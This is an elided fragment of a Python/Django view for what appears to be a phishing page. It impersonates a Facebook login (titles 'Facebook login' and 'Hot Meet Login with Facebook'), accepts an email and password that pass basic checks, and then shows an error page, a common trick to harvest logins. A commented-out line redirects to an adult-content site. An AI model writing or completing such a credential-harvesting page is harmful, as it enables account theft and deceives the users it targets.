...
def index(request):
    ...
    context = {"include_js": include_js,
               "title": "Hot Meet Login with Facebook" if template == "index_err.html" else "Facebook login"}
        ...
        if email is not None and password is not None:
            if len(email) > 5 and "@" in email and len(password) > 6:
                ...
                if template == "index.html":
                    #return redirect("https://fapachi.com/gweenblack")
                    ...
                    return render(request,'index_err.html')
